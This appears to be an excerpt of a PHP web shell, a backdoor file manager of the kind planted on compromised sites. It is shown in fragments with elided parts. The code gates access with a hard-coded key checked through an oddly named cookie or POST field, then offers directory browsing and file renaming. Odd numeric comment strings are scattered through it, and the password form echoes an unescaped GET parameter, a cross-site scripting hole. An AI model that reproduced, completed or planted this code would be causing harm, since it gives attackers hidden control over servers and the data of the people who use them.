...
$auth_key = "fe94c45d035f68e9cb30e1c64858707c";
...
$pass = false;
if (isset($_COOKIE['pw_name_32065'])) {
    if(($_COOKIE['pw_name_32065']) == $auth_key) {
        $pass = true;
    }
} else {
    if (isset($_POST['pw_name_32065'])) {
        if(($_POST['pw_name_32065']) == $auth_key) {
            setcookie("pw_name_32065", $_POST['pw_name_32065']);
            $pass = true;
        }
    }
}
if (!$pass) {
    die("<form action='?p=' method=post ><input type=password name='pw_name_32065' value='".$_GET['pw']."'  required><input type=submit name='watching' ></form>");
}
// ---- // 1727920616202838 1727920616923023 1727920616562902 1727920616659587
...
foreach ($paths as $id => $dir_part) {
    ...
    if ($dir_part == '')
        continue;// 1727920616202838 1727920616923023 1727920616562902 1727920616659587
    echo "<a href='?p=";
    for ($i = 0; $i <= $id; $i++) {
...
if (isset($_GET['r'])) {
    ...
    <form method="post">
        ...
        if (isset($_POST['rename'])) {// 1727920616202838 1727920616923023 1727920616562902 1727920616659587
            $name = PATH . "/" . $_GET['r'];
